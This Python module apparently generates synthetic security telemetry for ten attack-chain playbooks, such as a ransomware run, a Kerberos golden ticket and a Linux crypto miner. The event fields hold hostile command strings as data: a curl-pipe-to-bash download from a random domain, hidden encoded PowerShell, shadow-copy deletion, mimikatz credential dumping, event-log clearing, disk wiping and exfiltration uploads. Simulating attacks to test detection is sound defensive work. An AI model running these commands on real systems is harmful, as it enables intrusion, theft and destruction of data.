import random
import string
from typing import Any, Dict, List

from .builder import build_base_event


def _rand_domain() -> str:
    name = "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=random.randint(8, 14)))
    tld = random.choice(["com", "net", "biz", "co"])
    return f"{name}.{tld}"


def _rand_hash() -> str:
    letters = string.hexdigits.lower()
    return "".join(random.choices(letters, k=64))


def _shared_context(ctx: Dict[str, Any]) -> Dict[str, Any]:
    """Pick user/asset/ip once so multiple events feel linked."""
    user = random.choice(ctx.get("ad_users", [{"Username": "unknown"}]))
    dst_ip = random.choice(ctx.get("dest_ips", ["10.0.1.20"]))
    asset = ctx.get("ip_to_asset", {}).get(dst_ip) or random.choice(ctx.get("assets", [{}]))
    src_ip = random.choice(ctx.get("source_ips", ["198.51.100.42"]))
    return {"user": user, "dst_ip": dst_ip, "asset": asset, "src_ip": src_ip}


_STOP_PROB = {
    ("blocked", "failure"): 0.8,
    ("blocked", "unknown"): 0.5,
    ("allowed", "failure"): 0.6,  # e.g., action said allowed but operation failed anyway
    ("logged", "failure"): 0.4,
}


def _append_and_maybe_stop(events: List[Dict[str, Any]], evt: Dict[str, Any]) -> bool:
    """Add event; optionally stop chain when enforcement likely terminated flow."""
    events.append(evt)
    action = evt.get("event", {}).get("action")
    outcome = evt.get("event", {}).get("outcome")
    prob = _STOP_PROB.get((action, outcome), 0)
    if prob and random.random() < prob:
        evt["chain_stop_reason"] = "blocked_mid_chain"
        return True
    return False


def powershell_dropper_chain(ctx: Dict[str, Any], attack_id: str, start_ts: int) -> List[Dict[str, Any]]:
    """Windows initial access chain: email -> PowerShell -> dropped binary -> outbound HTTP."""
    shared = _shared_context(ctx)
    events = []

    # Step 1: initial access via Outlook spawning PowerShell
    evt1 = build_base_event(
        start_ts,
        ctx,
        overrides={
            **shared,
            "category": "malicious_powershell_detect",
            "severity": "3",
            "attack": {"id": attack_id, "stage": "initial_access", "sequence": 1},
            "action": "blocked",
        },
    )
    encoded = "".join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=", k=80))
    evt1["process"] = {
        "pid": random.randint(4000, 9000),
        "name": "powershell.exe",
        "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "command_line": f"powershell.exe -nop -w hidden -enc {encoded}",
        "parent": {
            "pid": random.randint(3000, 6500),
            "name": "outlook.exe",
            "command_line": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE /embedding",
        },
    }
    evt1["dns"] = {"question": {"name": _rand_domain(), "type": "A"}}
    evt1["http"] = {"method": "GET", "response": {"status_code": random.choice([200, 404])}}
    evt1["url"] = {"full": f"https://cdn.{_rand_domain()}/payload.bin"}
    evt1["file"] = {
        "path": "C:\\Windows\\Temp\\svch0st.exe",
        "extension": "exe",
        "size": random.randint(40000, 80000),
        "hash": {"sha256": _rand_hash()},
    }
    evt1["registry"] = {
        "path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDriveUpdater",
        "data.strings": ["C:\\Windows\\Temp\\svch0st.exe -m update"],
    }
    if _append_and_maybe_stop(events, evt1):
        return events

    # Step 2: recon after dropper landing
    evt2 = build_base_event(
        start_ts + random.randint(5, 45),
        ctx,
        overrides={
            **shared,
            "category": "retrohunt",
            "severity": "2",
            "attack": {"id": attack_id, "stage": "recon", "sequence": 2},
            "action": "logged",
        },
    )
    evt2["process"] = {
        "pid": random.randint(5000, 11000),
        "name": "whoami.exe",
        "command_line": "whoami /all",
    }
    if _append_and_maybe_stop(events, evt2):
        return events

    # Step 3: exfil preparation via HTTPS PUT
    evt3 = build_base_event(
        start_ts + random.randint(60, 180),
        ctx,
        overrides={
            **shared,
            "category": "sigflow_alert",
            "severity": "3",
            "attack": {"id": attack_id, "stage": "exfiltration", "sequence": 3},
            "action": "blocked",
        },
    )
    evt3["file"] = {
        "path": "C:\\Users\\Public\\report.zip",
        "extension": "zip",
        "size": random.randint(1500000, 5000000),
        "hash": {"sha256": _rand_hash()},
    }
    evt3["http"] = {"method": "PUT", "response": {"status_code": random.choice([200, 403, 500])}}
    evt3["url"] = {"full": f"https://{_rand_domain()}/upload"}
    evt3["network"]["direction"] = "outbound"
    _append_and_maybe_stop(events, evt3)

    return events


def ssh_lateral_chain(ctx: Dict[str, Any], attack_id: str, start_ts: int) -> List[Dict[str, Any]]:
    """Linux lateral movement chain using SSH and data staging."""
    shared = _shared_context(ctx)
    events = []

    # Step 1: brute force / credential stuffing
    evt1 = build_base_event(
        start_ts,
        ctx,
        overrides={
            **shared,
            "category": "malcore",
            "severity": "3",
            "attack": {"id": attack_id, "stage": "credential_access", "sequence": 1},
            "dest_port": 22,
            "direction": "inbound",
            "action": "blocked",
        },
    )
    evt1["logon"] = {"failure_reason": random.choice(["bad_password", "expired_password"]), "type": "network"}
    if _append_and_maybe_stop(events, evt1):
        return events

    # Step 2: successful SSH and recon
    evt2 = build_base_event(
        start_ts + random.randint(10, 60),
        ctx,
        overrides={
            **shared,
            "category": "retrohunt",
            "severity": "2",
            "attack": {"id": attack_id, "stage": "lateral_movement", "sequence": 2},
            "dest_port": 22,
            "direction": "inbound",
            "action": "allowed",
        },
    )
    evt2["process"] = {
        "pid": random.randint(2000, 6000),
        "name": "ssh",
        "command_line": f"ssh -o StrictHostKeyChecking=no user@{shared['dst_ip']}",
    }
    if _append_and_maybe_stop(events, evt2):
        return events

    # Step 3: staging data for exfil
    evt3 = build_base_event(
        start_ts + random.randint(90, 240),
        ctx,
        overrides={
            **shared,
            "category": "sigflow_alert",
            "severity": "3",
            "attack": {"id": attack_id, "stage": "collection", "sequence": 3},
            "action": "logged",
        },
    )
    evt3["process"] = {"name": "tar", "command_line": "tar -czf /tmp/ssl_backup.tgz /etc/ssl"}
    evt3["file"] = {
        "path": "/tmp/ssl_backup.tgz",
        "extension": "tgz",
        "size": random.randint(800000, 2500000),
        "hash": {"sha256": _rand_hash()},
    }
    evt3["network"]["direction"] = "internal"
    _append_and_maybe_stop(events, evt3)

    return events


def ransomware_encryption_chain(ctx: Dict[str, Any], attack_id: str, start_ts: int) -> List[Dict[str, Any]]:
    """Windows ransomware flow: macro -> shadow copy wipe -> encryption + ransom note."""
    shared = _shared_context(ctx)
    events = []

    evt1 = build_base_event(
        start_ts,
        ctx,
        overrides={
            **shared,
            "category": "malicious_powershell_detect",
            "severity": "3",
            "attack": {"id": attack_id, "stage": "initial_access", "sequence": 1},
            "action": "blocked",
        },
    )
    evt1["process"] = {
        "pid": random.randint(3000, 7000),
        "name": "wscript.exe",
        "command_line": "wscript.exe C:\\Users\\Public\\invoice.js",
        "parent": {"name": "winword.exe", "command_line": "WINWORD.EXE /q /n"},
    }
    evt1["file"] = {
        "path": "C:\\Users\\Public\\invoice.js",
        "extension": "js",
        "size": random.randint(25000, 60000),
        "hash": {"sha256": _rand_hash()},
    }
    if _append_and_maybe_stop(events, evt1):
        return events

    evt2 = build_base_event(
        start_ts + random.randint(20, 90),
        ctx,
        overrides={
            **shared,
            "category": "shellcode_detect",
            "severity": "4",
            "attack": {"id": attack_id, "stage": "defense_evasion", "sequence": 2},
            "action": "blocked",
        },
    )
    evt2["process"] = {
        "pid": random.randint(6000, 11000),
        "name": "vssadmin.exe",
        "command_line": "vssadmin delete shadows /all /quiet",
    }
    if _append_and_maybe_stop(events, evt2):
        return events

    evt3 = build_base_event(
        start_ts + random.randint(120, 240),
        ctx,
        overrides={
            **shared,
            "category": "sigflow_alert",
            "severity": "4",
            "attack": {"id": attack_id, "stage": "impact", "sequence": 3},
            "action": "logged",
        },
    )
    evt3["file"] = {
        "path": "C:\\Users\\Public\\readme_for_decryption.txt",
        "extension": "txt",
        "size": random.randint(2000, 6000),
        "hash": {"sha256": _rand_hash()},
    }
    evt3["process"] = {
        "name": "encryptor.exe",
        "command_line": "encryptor.exe --threads 8 --paths C:\\Users",
    }
    evt3["network"]["direction"] = "internal"
    _append_and_maybe_stop(events, evt3)

    return events


def sql_injection_exfil_chain(ctx: Dict[str, Any], attack_id: str, start_ts: int) -> List[Dict[str, Any]]:
    """Web to DB compromise: SQLi probe -> dump -> HTTPS exfiltration."""
    shared = _shared_context(ctx)
    events = []

    evt1 = build_base_event(
        start_ts,
        ctx,
        overrides={
            **shared,
            "category": "malcore",
            "severity": "2",
            "attack": {"id": attack_id, "stage": "initial_access", "sequence": 1},
            "dest_port": 443,
            "direction": "inbound",
            "action": "blocked",
        },
    )
    evt1["http"] = {"method": "POST", "response": {"status_code": random.choice([403, 500, 200])}}
    evt1["url"] = {"full": f"https://{_rand_domain()}/login.php?user=admin'--"}
    if _append_and_maybe_stop(events, evt1):
        return events

    evt2 = build_base_event(
        start_ts + random.randint(30, 120),
        ctx,
        overrides={
            **shared,
            "category": "retrohunt",
            "severity": "3",
            "attack": {"id": attack_id, "stage": "collection", "sequence": 2},
            "action": "allowed",
        },
    )
    evt2["process"] = {
        "name": "mysqldump",
        "command_line": "mysqldump -u webapp -p*** customers > /tmp/customer_dump.sql",
    }
    evt2["file"] = {
        "path": "/tmp/customer_dump.sql",
        "extension": "sql",
        "size": random.randint(5_000_000, 25_000_000),
        "hash": {"sha256": _rand_hash()},
    }
    if _append_and_maybe_stop(events, evt2):
        return events

    evt3 = build_base_event(
        start_ts + random.randint(150, 360),
        ctx,
        overrides={
            **shared,
            "category": "sigflow_alert",
            "severity": "3",
            "attack": {"id": attack_id, "stage": "exfiltration", "sequence": 3},
            "action": "blocked",
        },
    )
    evt3["http"] = {"method": "POST", "response": {"status_code": random.choice([200, 403])}}
    evt3["url"] = {"full": f"https://cdn.{_rand_domain()}/upload"}
    evt3["file"] = {
        "path": "/tmp/customer_dump.sql.gz",
        "extension": "gz",
        "size": random.randint(2_000_000, 10_000_000),
        "hash": {"sha256": _rand_hash()},
    }
    evt3["network"]["direction"] = "outbound"
    _append_and_maybe_stop(events, evt3)

    return events


def rdp_persistence_chain(ctx: Dict[str, Any], attack_id: str, start_ts: int) -> List[Dict[str, Any]]:
    """Credential reuse leading to RDP access and persistence via scheduled task."""
    shared = _shared_context(ctx)
    events = []

    evt1 = build_base_event(
        start_ts,
        ctx,
        overrides={
            **shared,
            "category": "malcore",
            "severity": "2",
            "attack": {"id": attack_id, "stage": "credential_access", "sequence": 1},
            "dest_port": 3389,
            "direction": "inbound",
            "action": "allowed",
        },
    )
    evt1["logon"] = {"type": "rdp", "method": "network"}
    if _append_and_maybe_stop(events, evt1):
        return events

    evt2 = build_base_event(
        start_ts + random.randint(15, 60),
        ctx,
        overrides={
            **shared,
            "category": "retrohunt",
            "severity": "2",
            "attack": {"id": attack_id, "stage": "persistence", "sequence": 2},
            "action": "logged",
        },
    )
    evt2["process"] = {
        "name": "schtasks.exe",
        "command_line": 'schtasks /Create /SC MINUTE /MO 30 /TN "OneDrive Updater" /TR "C:\\Windows\\Temp\\svc.exe"',
    }
    if _append_and_maybe_stop(events, evt2):
        return events

    evt3 = build_base_event(
        start_ts + random.randint(90, 300),
        ctx,
        overrides={
            **shared,
            "category": "sigflow_alert",
            "severity": "3",
            "attack": {"id": attack_id, "stage": "lateral_movement", "sequence": 3},
            "action": "logged",
        },
    )
    evt3["process"] = {
        "name": "mstsc.exe",
        "command_line": "mstsc.exe /v:fileserver01.fusionai.local",
    }
    evt3["network"]["direction"] = "internal"
    _append_and_maybe_stop(events, evt3)

    return events


def vpn_phishing_chain(ctx: Dict[str, Any], attack_id: str, start_ts: int) -> List[Dict[str, Any]]:
    """Phishing-led VPN compromise followed by data theft over HTTPS."""
    shared = _shared_context(ctx)
    events: List[Dict[str, Any]] = []

    evt1 = build_base_event(
        start_ts,
        ctx,
        overrides={
            **shared,
            "category": "malcore",
            "severity": "2",
            "attack": {"id": attack_id, "stage": "initial_access", "sequence": 1},
            "dest_port": 443,
            "direction": "inbound",
            "action": "allowed",
        },
    )
    evt1["logon"] = {
        "type": "vpn",
        "status": "success",
        "method": "push",
        "geo": random.choice(["CN", "RU", "RO", "BR", "NG"]),
    }
    evt1["network"]["direction"] = "inbound"
    if _append_and_maybe_stop(events, evt1):
        return events

    evt2 = build_base_event(
        start_ts + random.randint(5, 60),
        ctx,
        overrides={
            **shared,
            "category": "malicious_powershell_detect",
            "severity": "3",
            "attack": {"id": attack_id, "stage": "execution", "sequence": 2},
            "action": "logged",
        },
    )
    encoded = "".join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=", k=70))
    evt2["process"] = {
        "name": "powershell.exe",
        "command_line": f"powershell.exe -nop -w hidden -enc {encoded}",
        "parent": {"name": "explorer.exe", "command_line": "explorer.exe"},
    }
    evt2["dns"] = {"question": {"name": f"cdn.{_rand_domain()}", "type": "A"}}
    if _append_and_maybe_stop(events, evt2):
        return events

    evt3 = build_base_event(
        start_ts + random.randint(90, 240),
        ctx,
        overrides={
            **shared,
            "category": "sigflow_alert",
            "severity": "3",
            "attack": {"id": attack_id, "stage": "exfiltration", "sequence": 3},
            "action": "blocked",
        },
    )
    evt3["http"] = {"method": "POST", "response": {"status_code": random.choice([200, 202, 403])}}
    evt3["url"] = {"full": f"https://{_rand_domain()}/upload.php"}
    evt3["file"] = {
        "path": "C:\\Users\\Public\\vpn_creds.csv",
        "extension": "csv",
        "size": random.randint(10000, 60000),
        "hash": {"sha256": _rand_hash()},
    }
    evt3["network"]["direction"] = "outbound"
    _append_and_maybe_stop(events, evt3)

    return events


def kerberos_golden_ticket_chain(ctx: Dict[str, Any], attack_id: str, start_ts: int) -> List[Dict[str, Any]]:
    """Detectable flow for Kerberos ticket forgery and lateral movement."""
    shared = _shared_context(ctx)
    events: List[Dict[str, Any]] = []

    evt1 = build_base_event(
        start_ts,
        ctx,
        overrides={
            **shared,
            "category": "shellcode_detect",
            "severity": "4",
            "attack": {"id": attack_id, "stage": "credential_access", "sequence": 1},
            "action": "blocked",
        },
    )
    evt1["process"] = {
        "name": "mimikatz.exe",
        "command_line": 'mimikatz "privilege::debug" "lsadump::lsa /inject"',
    }
    evt1["file"] = {
        "path": "C:\\Temp\\krbtgt.dmp",
        "extension": "dmp",
        "size": random.randint(500000, 1500000),
        "hash": {"sha256": _rand_hash()},
    }
    if _append_and_maybe_stop(events, evt1):
        return events

    evt2 = build_base_event(
        start_ts + random.randint(20, 120),
        ctx,
        overrides={
            **shared,
            "category": "retrohunt",
            "severity": "3",
            "attack": {"id": attack_id, "stage": "privilege_escalation", "sequence": 2},
            "action": "logged",
        },
    )
    evt2["process"] = {
        "name": "klist.exe",
        "command_line": "klist tgt",
    }
    evt2["logon"] = {"type": "network", "method": "kerberos", "status": "success"}
    if _append_and_maybe_stop(events, evt2):
        return events

    evt3 = build_base_event(
        start_ts + random.randint(180, 360),
        ctx,
        overrides={
            **shared,
            "category": "sigflow_alert",
            "severity": "4",
            "attack": {"id": attack_id, "stage": "lateral_movement", "sequence": 3},
            "action": "allowed",
        },
    )
    evt3["process"] = {
        "name": "wmic.exe",
        "command_line": "wmic /node:fileserver01 process call create cmd.exe /c whoami",
    }
    evt3["network"]["direction"] = "internal"
    _append_and_maybe_stop(events, evt3)

    return events


def linux_crypto_miner_chain(ctx: Dict[str, Any], attack_id: str, start_ts: int) -> List[Dict[str, Any]]:
    """Compromise of a Linux host to deploy a cryptocurrency miner."""
    shared = _shared_context(ctx)
    events: List[Dict[str, Any]] = []

    evt1 = build_base_event(
        start_ts,
        ctx,
        overrides={
            **shared,
            "category": "malcore",
            "severity": "3",
            "attack": {"id": attack_id, "stage": "initial_access", "sequence": 1},
            "dest_port": random.choice([8080, 7001, 9000]),
            "direction": "inbound",
            "action": "allowed",
        },
    )
    evt1["process"] = {
        "name": "curl",
        "command_line": f"curl -fsSL http://{_rand_domain()}/install.sh | bash",
    }
    evt1["network"]["direction"] = "inbound"
    if _append_and_maybe_stop(events, evt1):
        return events

    evt2 = build_base_event(
        start_ts + random.randint(10, 90),
        ctx,
        overrides={
            **shared,
            "category": "retrohunt",
            "severity": "3",
            "attack": {"id": attack_id, "stage": "execution", "sequence": 2},
            "action": "logged",
        },
    )
    evt2["process"] = {
        "name": "bash",
        "command_line": "bash install.sh && chmod +x /tmp/xmrig",
    }
    evt2["file"] = {
        "path": "/tmp/xmrig",
        "extension": "",
        "size": random.randint(500000, 2500000),
        "hash": {"sha256": _rand_hash()},
    }
    if _append_and_maybe_stop(events, evt2):
        return events

    evt3 = build_base_event(
        start_ts + random.randint(120, 300),
        ctx,
        overrides={
            **shared,
            "category": "sigflow_alert",
            "severity": "3",
            "attack": {"id": attack_id, "stage": "impact", "sequence": 3},
            "action": "blocked",
        },
    )
    evt3["process"] = {
        "name": "xmrig",
        "command_line": "./xmrig -o pool.supportxmr.com:3333 -u 48ff... -k --tls",
    }
    evt3["network"] = {
        **evt3["network"],
        "direction": "outbound",
        "protocol": "tcp",
    }
    evt3["destination"]["port"] = random.choice([3333, 4444, 5555])
    _append_and_maybe_stop(events, evt3)

    return events


def cloud_cli_abuse_chain(ctx: Dict[str, Any], attack_id: str, start_ts: int) -> List[Dict[str, Any]]:
    """Stolen cloud API keys abused via CLI to inventory and steal data."""
    shared = _shared_context(ctx)
    events: List[Dict[str, Any]] = []

    evt1 = build_base_event(
        start_ts,
        ctx,
        overrides={
            **shared,
            "category": "malcore",
            "severity": "2",
            "attack": {"id": attack_id, "stage": "initial_access", "sequence": 1},
            "action": "allowed",
        },
    )
    evt1["process"] = {
        "name": "aws",
        "command_line": "aws configure set aws_access_key_id AKIA****",
    }
    if _append_and_maybe_stop(events, evt1):
        return events

    evt2 = build_base_event(
        start_ts + random.randint(15, 90),
        ctx,
        overrides={
            **shared,
            "category": "retrohunt",
            "severity": "3",
            "attack": {"id": attack_id, "stage": "discovery", "sequence": 2},
            "action": "logged",
        },
    )
    evt2["process"] = {
        "name": "aws",
        "command_line": "aws ec2 describe-instances --region us-east-1",
    }
    evt2["http"] = {"method": "POST", "response": {"status_code": 200}}
    evt2["url"] = {"full": "https://ec2.amazonaws.com"}
    evt2["network"]["direction"] = "outbound"
    if _append_and_maybe_stop(events, evt2):
        return events

    evt3 = build_base_event(
        start_ts + random.randint(120, 360),
        ctx,
        overrides={
            **shared,
            "category": "sigflow_alert",
            "severity": "3",
            "attack": {"id": attack_id, "stage": "collection", "sequence": 3},
            "action": "blocked",
        },
    )
    bucket = f"s3://{random.choice(['backups', 'exports', 'finance-data'])}-{random.randint(100,999)}"
    evt3["process"] = {
        "name": "aws",
        "command_line": f"aws s3 sync /tmp/exports {bucket}",
    }
    evt3["file"] = {
        "path": "/tmp/exports/customer_ledger.xlsx",
        "extension": "xlsx",
        "size": random.randint(200000, 800000),
        "hash": {"sha256": _rand_hash()},
    }
    evt3["url"] = {"full": f"https://{bucket.replace('s3://', '')}.s3.amazonaws.com"}
    evt3["network"]["direction"] = "outbound"
    _append_and_maybe_stop(events, evt3)

    return events


def smb_data_wiper_chain(ctx: Dict[str, Any], attack_id: str, start_ts: int) -> List[Dict[str, Any]]:
    """SMB lateral movement ending in destructive wiping."""
    shared = _shared_context(ctx)
    events: List[Dict[str, Any]] = []

    evt1 = build_base_event(
        start_ts,
        ctx,
        overrides={
            **shared,
            "category": "malcore",
            "severity": "3",
            "attack": {"id": attack_id, "stage": "initial_access", "sequence": 1},
            "dest_port": 445,
            "direction": "internal",
            "action": "allowed",
        },
    )
    evt1["process"] = {
        "name": "psexec.exe",
        "command_line": f"psexec.exe \\\\{shared['dst_ip']} cmd.exe /c whoami",
    }
    evt1["network"]["direction"] = "internal"
    if _append_and_maybe_stop(events, evt1):
        return events

    evt2 = build_base_event(
        start_ts + random.randint(30, 150),
        ctx,
        overrides={
            **shared,
            "category": "shellcode_detect",
            "severity": "3",
            "attack": {"id": attack_id, "stage": "defense_evasion", "sequence": 2},
            "action": "logged",
        },
    )
    evt2["process"] = {
        "name": "wevtutil.exe",
        "command_line": "wevtutil cl Security && wevtutil cl System",
    }
    if _append_and_maybe_stop(events, evt2):
        return events

    evt3 = build_base_event(
        start_ts + random.randint(200, 420),
        ctx,
        overrides={
            **shared,
            "category": "sigflow_alert",
            "severity": "4",
            "attack": {"id": attack_id, "stage": "impact", "sequence": 3},
            "action": "blocked",
        },
    )
    evt3["process"] = {
        "name": "cipher.exe",
        "command_line": "cipher.exe /w:C:\\Finance",
    }
    evt3["file"] = {
        "path": "C:\\Finance\\*.bak",
        "extension": "bak",
        "size": random.randint(5_000_000, 25_000_000),
        "hash": {"sha256": _rand_hash()},
    }
    evt3["network"]["direction"] = "internal"
    _append_and_maybe_stop(events, evt3)

    return events


PLAYBOOKS = [
    powershell_dropper_chain,
    ssh_lateral_chain,
    ransomware_encryption_chain,
    sql_injection_exfil_chain,
    rdp_persistence_chain,
    vpn_phishing_chain,
    kerberos_golden_ticket_chain,
    linux_crypto_miner_chain,
    cloud_cli_abuse_chain,
    smb_data_wiper_chain,
]
